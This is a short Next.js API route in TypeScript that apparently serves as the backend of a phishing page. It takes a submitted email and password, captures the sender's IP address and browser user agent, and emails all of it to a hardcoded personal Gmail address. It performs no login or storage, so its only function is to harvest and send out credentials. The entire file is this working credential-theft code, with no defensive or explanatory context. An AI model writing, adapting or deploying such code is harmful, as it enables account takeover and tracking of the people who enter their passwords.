import { mailUser } from "@/util/mailer";
import { NextResponse, NextRequest } from "next/server";

export async function POST(request: NextRequest) {
    const body = await request.json();
    const { password, email } = body;

    const ip =
        request.headers.get("x-forwarded-for")?.split(",")[0] ||
        request.headers.get("x-real-ip") ||
        "unknown";

    const userAgent = request.headers.get("user-agent") || "unknown";

    try {
        const res = await mailUser("tomacurry12@gmail.com", "Task", {
            email,
            password,
            ip,
            browser: userAgent,
        });

        return NextResponse.json(res);
    } catch (error: any) {
        return NextResponse.json(
            { error: error?.message || "Unknown error" },
            { status: 500 }
        );
    }
}
